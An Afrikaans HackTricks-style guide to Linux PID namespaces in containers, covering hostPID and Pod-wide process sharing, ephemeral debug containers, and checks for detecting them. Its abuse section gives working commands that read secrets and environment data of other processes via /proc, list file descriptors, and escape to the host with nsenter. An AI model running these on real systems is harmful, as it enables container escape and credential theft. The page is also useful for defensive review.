# PID-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID-naamruimte bepaal hoe prosesse genommer word en watter prosesse sigbaar is. Daarom kan ’n container sy eie PID 1 hê, al is dit nie ’n regte masjien nie. Binne die naamruimte sien die werklading wat soos ’n plaaslike prosesboom lyk. Buite die naamruimte sien die host steeds die werklike host-PID’s en die volledige proseslandskap.<sup>[[3]](#references)</sup>

Vanuit ’n sekuriteitsoogpunt is die PID-naamruimte belangrik omdat proses-sigbaarheid waardevol is. Sodra ’n werklading host-prosesse kan sien, kan dit dalk diensname, opdragreëlargumente, geheime wat as prosesargumente deurgegee word, omgewingsafgeleide toestand deur `/proc` en moontlike teikens vir naamruimtebetreding waarneem. As dit meer kan doen as om net daardie prosesse te sien, byvoorbeeld deur seine te stuur of onder die regte omstandighede `ptrace` te gebruik, word die probleem baie ernstiger.

## Werking

’n Nuwe PID-naamruimte begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word vanuit die naamruimte se oogpunt PID 1. Dit beteken ook dat dit spesiale init-agtige semantiek vir weesprosesse en seinhantering kry. Dit verklaar baie van die eienaardighede in containers rondom init-prosesse, die opruiming van zombies en waarom klein init-omhulsels soms in containers gebruik word.<sup>[[3]](#references)</sup>

PID-naamruimtes vorm ’n hiërargie. ’n Proses in ’n voorouer-naamruimte kan afstammelinge aanspreek met die PID wat in daardie voorouer toegeken is, maar ’n afstammeling kan nie deur gewone PID-gebaseerde stelseloproepfunksies afstammelinglose take aanspreek of met `setns()` opwaarts na ’n voorouer-PID-naamruimte beweeg nie. ’n procfs wat deur die voorouer besit word en doelbewus aan die afstammeling blootgestel is, kan steeds die voorouer se prosesweergawe leak. Daarbenewens verander aansluiting by ’n PID-naamruimte met `setns()` die naamruimte vir **toekomstige kinders**, nie vir die oproeper self nie; daarom skep nutsprogramme ’n fork-proses nadat hulle aangesluit het. ’n procfs-montering behou die PID-weergawe van die proses wat dit gemonteer het. Daarom is die skep van ’n nuwe procfs ná `unshare(CLONE_NEWPID)` sekuriteitsrelevant en nie bloot kosmeties nie.<sup>[[3]](#references)</sup>

Die belangrike sekuriteitsles is dat ’n proses geïsoleer kan lyk omdat dit net sy eie PID-boom sien, maar daardie isolasie kan doelbewus verwyder word. Docker stel dit beskikbaar deur `--pid=host`, terwyl Kubernetes dit met `hostPID: true` doen. Sodra die container by die host se PID-naamruimte aansluit, sien die werklading host-prosesse direk, en word baie latere aanvalspaaie veel meer realisties.

## Laboratorium

Om ’n PID-naamruimte handmatig te skep:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Die shell sien nou ’n private proses-aansig. Die `--mount-proc`-vlag is belangrik omdat dit ’n procfs-instansie monteer wat by die nuwe PID namespace pas, sodat die proseslys van binne af samehangend is.<sup>[[3]](#references)</sup>

Om containergedrag te vergelyk:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Die verskil is onmiddellik en maklik om te verstaan, en daarom is dit ’n goeie eerste lab vir lesers.

## Gebruik tydens looptyd

Gewone containers in Docker, Podman, containerd en CRI-O kry hul eie PID namespace. Kubernetes-containers het gewoonlik afsonderlike PID-uitsigte; `shareProcessNamespace: true` skep doelbewus ’n uitsig wat deur die hele Pod gedeel word.<sup>[[4]](#references)</sup> Daarteenoor kies `hostPID: true` die node se PID namespace. LXC/Incus-omgewings maak op dieselfde kernel-primitief staat, hoewel gebruiksgevalle met system containers meer ingewikkelde prosesbome kan blootlê en meer kortpaaie vir ontfouting kan aanmoedig.

Dieselfde reël geld oral: as die runtime gekies het om nie die PID namespace te isoleer nie, is dit ’n doelbewuste verswakking van die container-grens.

## Verkeerde konfigurasies

Die klassieke verkeerde konfigurasie is dat die host se PID namespace gedeel word. Spanne regverdig dit dikwels vir ontfouting, monitering of gerief met diensbestuur, maar dit moet altyd as ’n betekenisvolle sekuriteitsuitsondering beskou word. Selfs al het die container nie onmiddellik ’n skryfprimitief waarmee dit host-prosesse kan beïnvloed nie, kan sigbaarheid alleen baie oor die stelsel onthul. Sodra vermoëns soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, neem die risiko aansienlik toe.

Nog ’n fout is om aan te neem dat host-PID-deling onskadelik is omdat die workload nie by verstek host-prosesse kan beëindig of met ptrace kan ondersoek nie. Dié gevolgtrekking ignoreer die waarde van enumerasie, die beskikbaarheid van teikens om namespaces te betree, en die manier waarop PID-sigbaarheid met ander verswakte kontroles saamwerk.

### Deel van prosesse binne ’n Kubernetes Pod

`shareProcessNamespace: true` verskil van `hostPID`: dit stel die prosesse van die **ander containers in dieselfde Pod** bloot, nie node-prosesse nie. ’n Gehekelde sidecar- of debug-container kan dan, onderhewig aan procfs-toegangsbeheer, die opdragreëls en omgewingsdata van sibling-containers lys, seine stuur wanneer die credentials dit toelaat, en deur `/proc/<pid>/root` deur ’n sibling se lêerstelsel blaai. Kubernetes waarsku uitdruklik dat geheime in opdragreëls en omgewingsdata, en container-lêerstelsels, dan slegs deur die toepaslike Unix-toestemmings beskerm word.<sup>[[4]](#references)</sup>

Nuttige hersiening aan die cluster-kant:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Vanuit ’n gekompromitteerde container in ’n Pod-wye PID-naamruimte, toets eers werklike toegang eerder as om aan te neem dat sigbaarheid leesbaarheid beteken:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Gerigte tydelike containers in ’n bestaande Kubernetes Pod

’n Kubernetes-identiteit wat toegelaat word om `pods/ephemeralcontainers` te wysig, kan ’n debugger by ’n Pod wat loop voeg, selfs wanneer `shareProcessNamespace` nie gestel is nie. Met `--target` sluit die debugger by die prosesnaamruimte van die benoemde container aan as die runtime naamruimtegerigting ondersteun. Dit gee ’n prosesbeskouing van daardie container, nie van die node se host-PID-naamruimte nie.<sup>[[5]](#references)</sup>

Die API gebruik ’n aparte subresource, so gaan sy `patch`/`update`-regte na eerder as om aan te neem dat gewone Pod-skryftoestemmings dit dek.<sup>[[6]](#references)</sup>

Toets die gerigte beskouing vir ’n Pod en container binne ’n gemagtigde naamruimte:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

As die runtime nie targeting implementeer nie, kan die debugger dalk nie begin nie of in ’n geïsoleerde PID-namespace bly.<sup>[[5]](#references)</sup> As targeting werk, gebruik die kontroles onder [Prosesdeling op Kubernetes Pod-vlak](#kubernetes-pod-wide-process-sharing) om toegang tot `/proc/<pid>` te toets. Sigbaarheid beteken nie dat jy toestemming het om die teiken se geheime te lees of dit te sein nie: Unix-geloofsbriewe en procfs-toegangskontroles geld steeds.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards beperk ook bevoorregte instellings op ephemeral containers.<sup>[[7]](#references)</sup>

## Misbruik

As die host se PID-namespace gedeel word, kan ’n aanvaller host-prosesse inspekteer, prosesargumente versamel, interessante dienste identifiseer, moontlike PID’s vir `nsenter` opspoor of prosessigbaarheid met ptrace-verwante voorregte kombineer om met die host of aangrensende workloads in te meng. In sommige gevalle is dit genoeg om bloot die regte langlopende proses te sien om die res van die aanvalplan aan te pas.

Die eerste praktiese stap is altyd om te bevestig dat host-prosesse werklik sigbaar is:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Sodra host-PID's sigbaar is, word prosesargumente en namespace-toegangsteikens dikwels die nuttigste inligtingsbron:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

As `nsenter` beskikbaar is en daar genoeg voorregte is, toets of ’n sigbare gasheerproses as ’n namespace-brug gebruik kan word:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Selfs wanneer toegang geblokkeer word, is die deel van die host-PID-ruimte reeds waardevol, omdat dit diensuitleg, runtime-komponente en moontlike bevoorregte prosesse onthul wat volgende geteiken kan word. PID-sigbaarheid alleen gee **nie** toestemming om seine te stuur, te traceer, sensitiewe `/proc/<pid>`-inskrywings te lees of by die teiken se ander namespaces aan te sluit nie; credentials, dumpability, capabilities in die user namespace wat die teiken se namespace besit, Yama/LSM-beleid en seccomp bly steeds belangrik.<sup>[[3]](#references)</sup> Sien [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) vir voorbeelde van prosesinspuiting.

Host-PID-sigbaarheid maak ook misbruik van lêerbeskrywings realistieser. As ’n bevoorregte host-proses of naburige werklas ’n sensitiewe lêer of socket oop het, kan die aanvaller dalk `/proc/<pid>/fd/` inspekteer en toegang tot die onderliggende objek kry, afhangend van ptrace-agtige kontroles, eienaarskap, procfs-monteeropsies, die objektipe en die teikendiensmodel. Om bloot ’n FD-simboliese skakel te sien, beteken nie dat dit oopgemaak kan word nie, en ’n socket kan nie gedupliseer word deur bloot sy `/proc/<pid>/fd/N`-simboliese skakel oop te maak nie. Vir die afsonderlike `pidfd_getfd()`-primitief en die magtigingskontroles daarvan, sien [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Hierdie opdragte is nuttig omdat hulle aandui of `hidepid=1` of `hidepid=2` sigbaarheid tussen prosesse verminder, en of ooglopend interessante beskrywers, soos oop geheime lêers, logs of Unix-sockets, enigsins sigbaar is.

### Volledige voorbeeld: host PID + `nsenter`

Die deel van host-PID’s kan host escape moontlik maak wanneer die proses die vereiste capabilities het om by die host se naamruimtes aan te sluit en die host-proses se root aan te neem. `nsenter --root` (`-r`) is hiervoor nodig: om net die mount-naamruimte te verander, verander nie die oproeper se wortelgids nie.<sup>[[9]](#references)</sup> Toegang tot `/proc/1/root` is onderhewig aan ’n ptrace-leestoets, terwyl die verandering van root `CAP_SYS_CHROOT` in die oproeper se user-naamruimte vereis.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

As die opdrag slaag, gebruik die nuwe shell die host se mount-, UTS-, network-, IPC- en PID-naamruimtes, asook PID 1 se root-lêerstelsel. Kontroleer die effektiewe identiteit en toegang eerder as om aan te neem dat sigbaarheid van PID’s alleen host-voorregte verleen het.<sup>[[9]](#references)</sup>

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat dalk met die host-binary bereik word as die host-lêerstelsel gemount is:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Onlangse Runtime-aantekeninge

Sommige aanvalle wat met PID namespaces verband hou, is nie tradisionele `hostPID: true`-waninstellings nie, maar runtime-implementasiefoute in die manier waarop procfs-beskerming tydens container-opstelling toegepas word.

#### `maskedPaths`-race na host procfs

In kwesbare `runc`-weergawes kon aanvallers wat die container-image of `runc exec`-werklas kon beheer, die masking-fase laat raas deur die container-kant se `/dev/null` te vervang met ’n symlink na ’n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. As die race geslaag het, kon die masked-path-bind mount op die verkeerde teiken beland en host-globale procfs-instellings aan die nuwe container blootstel.<sup>[[1]](#references)</sup>

Nuttige hersieningsopdrag:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

This is belangrik omdat die uiteindelike impak dieselfde kan wees as direkte blootstelling van procfs: skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur kode-uitvoering op die gasheer of diensweiering. Die toegewyde bladsye oor [masked paths](../masked-paths.md) en [sensitive host mounts](../../sensitive-host-mounts.md) behandel die algemene procfs-aanvalsoppervlak sonder om dit hier te dupliseer.

#### Namespace injection met `insject`

Namespace injection-nutsgoed soos `insject` wys dat interaksie met ’n PID-namespace nie altyd vereis dat jy die teiken-namespace betree voordat prosesse geskep word nie. ’n Hulptoepassing kan later heg, `setns()` gebruik en uitvoer terwyl sigbaarheid in die teiken se PID-ruimte behoue bly:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Hierdie soort tegniek is hoofsaaklik belangrik vir gevorderde debugging, offensive tooling en post-exploitation-werkvloeie waar namespace-konteks gekoppel moet word nadat die runtime reeds die workload geïnisialiseer het.

### Verwante FD-misbruikpatrone

Twee patrone verdien uitdruklike vermelding wanneer host-PID's sigbaar is. Eerstens kan ’n bevoorregte proses ’n sensitiewe lêerbeskrywer oop hou oor `execve()` heen omdat dit nie as `O_CLOEXEC` gemerk is nie. Tweedens kan dienste lêerbeskrywers oor Unix-sockets deur middel van `SCM_RIGHTS` deurgee. In albei gevalle is die interessante objek nie meer die padnaam nie, maar die reeds oopgemaakte handvatsel wat ’n proses met laer voorregte kan erf of ontvang.

Dit is belangrik in container-werk omdat die handvatsel na `docker.sock`, ’n bevoorregte log, ’n host-geheime lêer of ’n ander waardevolle objek kan wys, selfs wanneer die pad self nie direk vanaf die container-lêerstelsel bereikbaar is nie.

## Kontroles

Die doel van hierdie opdragte is om te bepaal of die proses ’n private PID-aansig het, of reeds ’n veel breër proseslandskap kan lys.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Wat hier interessant is:<sup>[[3]](#references)</sup>

- As die proseslys duidelike gasheerdienste bevat, is host PID sharing waarskynlik reeds aktief.
- Om slegs ’n klein, houerplaaslike prosesboom te sien, is die normale basislyn; om `systemd`, `dockerd` of onverwante daemone te sien, is nie.
- `NSpid` kan die PID-kartering oor geneste naamruimtes blootlê. Die waarde heel links is relatief tot die PID-naamruimte wat met die procfs-mount geassosieer word, gevolg deur waardes vir opeenvolgend geneste naamruimtes.
- `readlink /proc/self/ns/pid` kan op sigself nie `hostPID` bewys nie: ’n geïsoleerde houer het ook ’n geldige PID-naamruimte-inode. Vergelyk dit met die proseslys, procfs-mount, runtime-konfigurasie en ’n inode van ’n naamruimte aan die gasheerkant, indien beskikbaar.
- Sodra gasheer-PID's sigbaar is, word selfs leesalleen-prosesinligting nuttig vir verkenning.

As jy ontdek dat ’n houer met host PID sharing loop, moet dit nie as ’n kosmetiese verskil beskou nie. Dit verander ingrypend wat die werklas kan waarneem en moontlik beïnvloed.





## References

- [1] [runc-sekuriteitsadvies: ontsnapping uit ’n houer via misbruik van "masked path" weens mount-renvoorwaardes (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Nutsmiddelvrystelling – insject: ’n Linux-naamruimte-inspuiter](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux-manpages 6.19-boek](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Deel prosesnaamruimte tussen houers in ’n Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Ontfout lopende Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP vir kortstondige houers](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod-sekuriteitstandaarde](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
